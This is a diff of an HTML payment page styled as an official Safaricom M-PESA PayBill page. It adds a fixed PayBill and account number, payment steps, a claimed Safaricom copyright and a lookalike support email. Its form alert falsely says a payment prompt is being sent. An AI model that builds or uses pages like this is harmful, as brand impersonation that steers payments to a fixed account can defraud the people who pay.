@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Lipa na M-PESA - Secure Mobile Payments</title>
+    <title>PayBill via M-PESA - Secure Business Payments</title>
     <style>
         :root {
             --safaricom-green: #00A651;
@@ -11,6 +11,7 @@
             --safaricom-yellow: #FFD700;
             --safaricom-orange: #FFA500;
             --safaricom-blue: #0072BC;
+            --safaricom-purple: #6A0DAD;
         }
         
         body {
@@ -28,7 +29,7 @@
         }
         
         header {
-            background: linear-gradient(to right, var(--safaricom-green), var(--safaricom-light-green));
+            background: linear-gradient(to right, var(--safaricom-purple), var(--safaricom-blue));
             color: white;
             padding: 20px;
             border-radius: 10px 10px 0 0;
@@ -49,6 +50,25 @@
             box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
         }
         
+        .paybill-info {
+            background-color: #f0f8ff;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            border-left: 5px solid var(--safaricom-blue);
+        }
+        
+        .paybill-info p {
+            margin: 5px 0;
+            font-size: 16px;
+        }
+        
+        .paybill-info .highlight {
+            font-weight: bold;
+            color: var(--safaricom-purple);
+            font-size: 18px;
+        }
+        
         .form-group {
             margin-bottom: 20px;
         }
@@ -57,7 +77,7 @@
             display: block;
             margin-bottom: 8px;
             font-weight: bold;
-            color: var(--safaricom-blue);
+            color: var(--safaricom-purple);
         }
         
         input, select {
@@ -70,12 +90,12 @@
         }
         
         input:focus, select:focus {
-            border-color: var(--safaricom-green);
+            border-color: var(--safaricom-blue);
             outline: none;
         }
         
         .btn {
-            background: linear-gradient(to right, var(--safaricom-green), var(--safaricom-light-green));
+            background: linear-gradient(to right, var(--safaricom-purple), var(--safaricom-blue));
             color: white;
             border: none;
             padding: 14px 20px;
@@ -85,13 +105,13 @@
             width: 100%;
             font-weight: bold;
             transition: all 0.3s;
-            box-shadow: 0 4px 6px rgba(0, 166, 81, 0.2);
+            box-shadow: 0 4px 6px rgba(106, 13, 173, 0.2);
         }
         
         .btn:hover {
-            background: linear-gradient(to right, #008a43, #7bb83a);
+            background: linear-gradient(to right, #5a0b9c, #0061a3);
             transform: translateY(-2px);
-            box-shadow: 0 6px 8px rgba(0, 166, 81, 0.3);
+            box-shadow: 0 6px 8px rgba(106, 13, 173, 0.3);
         }
         
         .benefits {
@@ -99,11 +119,11 @@
             padding: 20px;
             background-color: #f9f9f9;
             border-radius: 8px;
-            border-left: 5px solid var(--safaricom-green);
+            border-left: 5px solid var(--safaricom-purple);
         }
         
         .benefits h3 {
-            color: var(--safaricom-green);
+            color: var(--safaricom-purple);
             margin-top: 0;
         }
         
@@ -126,27 +146,34 @@
             font-size: 20px;
         }
         
-        .payment-options {
-            display: flex;
-            justify-content: center;
+        .steps {
             margin: 20px 0;
+            padding: 15px;
+            background-color: #fff8e1;
+            border-radius: 8px;
         }
         
-        .payment-option {
-            margin: 0 10px;
-            text-align: center;
-            cursor: pointer;
-            transition: transform 0.3s;
+        .steps h3 {
+            color: var(--safaricom-orange);
+            margin-top: 0;
         }
         
-        .payment-option:hover {
-            transform: scale(1.1);
+        .step {
+            margin-bottom: 10px;
+            display: flex;
         }
         
-        .payment-option img {
-            width: 60px;
-            height: 60px;
-            object-fit: contain;
+        .step-number {
+            background-color: var(--safaricom-orange);
+            color: white;
+            width: 25px;
+            height: 25px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 10px;
+            font-size: 14px;
         }
         
         footer {
@@ -170,96 +197,126 @@
 <body>
     <div class="container">
         <header>
-            <div class="logo">Lipa na M-PESA</div>
-            <p>Fast, Secure, and Convenient Mobile Payments</p>
+            <div class="logo">PayBill via M-PESA</div>
+            <p>Secure Business and Bill Payments Made Easy</p>
         </header>
         
         <div class="payment-card">
-            <form id="mpesaPaymentForm">
+            <div class="paybill-info">
+                <p><strong>PayBill Number:</strong> <span class="highlight">542542</span></p>
+                <p><strong>Account Number:</strong> <span class="highlight">847242</span></p>
+                <p><em>Please ensure you enter the correct account number for proper crediting</em></p>
+            </div>
+            
+            <form id="paybillPaymentForm">
                 <div class="form-group">
-                    <label for="phone">M-PESA Phone Number</label>
+                    <label for="phone">Your M-PESA Phone Number</label>
                     <input type="tel" id="phone" placeholder="e.g. 254712345678" required>
                 </div>
                 
                 <div class="form-group">
-                    <label for="amount">Amount (KES)</label>
+                    <label for="amount">Amount to Pay (KES)</label>
                     <input type="number" id="amount" placeholder="Enter amount" min="1" required>
                 </div>
                 
-                <div class="form-group">
-                    <label for="account">Account Reference (Optional)</label>
-                    <input type="text" id="account" placeholder="e.g. Order #1234">
-                </div>
-                
-                <button type="submit" class="btn">Pay with M-PESA</button>
+                <button type="submit" class="btn">Pay via PayBill</button>
             </form>
             
-            <div class="payment-options">
-                <div class="payment-option">
-                    <img src="https://www.safaricom.co.ke/images/mpesa-logo.png" alt="M-PESA">
+            <div class="steps">
+                <h3>How to Pay via PayBill</h3>
+                <div class="step">
+                    <div class="step-number">1</div>
+                    <div>Go to M-PESA on your phone</div>
+                </div>
+                <div class="step">
+                    <div class="step-number">2</div>
+                    <div>Select "PayBill" option</div>
+                </div>
+                <div class="step">
+                    <div class="step-number">3</div>
+                    <div>Enter Business Number <strong>542542</strong></div>
+                </div>
+                <div class="step">
+                    <div class="step-number">4</div>
+                    <div>Enter Account Number <strong>847242</strong></div>
+                </div>
+                <div class="step">
+                    <div class="step-number">5</div>
+                    <div>Enter the Amount and your M-PESA PIN</div>
+                </div>
+                <div class="step">
+                    <div class="step-number">6</div>
+                    <div>Confirm details and complete payment</div>
                 </div>
             </div>
             
             <div class="benefits">
-                <h3>Why M-PESA is the Preferred Payment Method</h3>
+                <h3>Why PayBill is the Preferred Payment Method for Businesses</h3>
                 
                 <div class="benefit-item">
-                    <div class="benefit-icon">✓</div>
+                    <div class="benefit-icon">🏢</div>
                     <div>
-                        <strong>Instant Transactions:</strong> Payments are completed in seconds, no waiting for bank processing.
+                        <strong>Business Efficiency:</strong> Streamlines payments for businesses with proper record-keeping and automatic reconciliation.
                     </div>
                 </div>
                 
                 <div class="benefit-item">
                     <div class="benefit-icon">🔒</div>
                     <div>
-                        <strong>Highly Secure:</strong> PIN-protected transactions with SMS confirmation for every payment.
+                        <strong>Secure Transactions:</strong> Eliminates risks associated with cash handling and provides digital records.
                     </div>
                 </div>
                 
                 <div class="benefit-item">
-                    <div class="benefit-icon">📱</div>
+                    <div class="benefit-icon">⏱</div>
                     <div>
-                        <strong>Mobile Convenience:</strong> Pay directly from your phone anytime, anywhere - no need for cards or cash.
+                        <strong>Instant Processing:</strong> Payments reflect immediately in business accounts, improving cash flow.
                     </div>
                 </div>
                 
                 <div class="benefit-item">
-                    <div class="benefit-icon">🌍</div>
+                    <div class="benefit-icon">📊</div>
                     <div>
-                        <strong>Widely Accepted:</strong> Used by millions in Kenya and beyond, accepted by most businesses.
+                        <strong>Better Accounting:</strong> Account numbers help businesses track payments from different customers easily.
                     </div>
                 </div>
                 
                 <div class="benefit-item">
-                    <div class="benefit-icon">💡</div>
+                    <div class="benefit-icon">💳</div>
                     <div>
-                        <strong>No Bank Account Needed:</strong> Accessible to everyone with a mobile phone, promoting financial inclusion.
+                        <strong>No Cash Handling:</strong> Reduces risks and costs associated with physical cash management.
+                    </div>
+                </div>
+                
+                <div class="benefit-item">
+                    <div class="benefit-icon">🌐</div>
+                    <div>
+                        <strong>24/7 Availability:</strong> Customers can pay anytime, even outside business hours.
                     </div>
                 </div>
             </div>
         </div>
         
         <footer>
-            <p>© 2023 Safaricom PLC. M-PESA is a mobile money service by Safaricom.</p>
-            <p>Customer care: 100 (Safaricom) | 200 (Other Networks)</p>
+            <p>© 2023 Safaricom PLC. M-PESA PayBill is a service by Safaricom.</p>
+            <p>For support: Call 100 (Safaricom) | 200 (Other Networks) or email support@paybill542542.co.ke</p>
         </footer>
     </div>
     
     <script>
-        document.getElementById('mpesaPaymentForm').addEventListener('submit', function(e) {
+        document.getElementById('paybillPaymentForm').addEventListener('submit', function(e) {
             e.preventDefault();
             
             const phone = document.getElementById('phone').value;
             const amount = document.getElementById('amount').value;
-            const account = document.getElementById('account').value;
+            const paybill = "542542";
+            const account = "847242";
             
             // In a real implementation, you would send this to your backend
-            // to process the M-PESA payment via the API
-            alert(Payment request for KES ${amount} to ${phone} is being processed. You will receive an M-PESA confirmation prompt on your phone.);
+            alert(Payment request for KES ${amount} to PayBill ${paybill} (Account: ${account}) from ${phone} is being processed. You will receive an M-PESA confirmation prompt on your phone.);
             
-            // Reset form
-            this.reset();
+            // Reset form (keeping the amount for possible repeat payments)
+            document.getElementById('phone').value = '';
         });
     </script>
 </body>
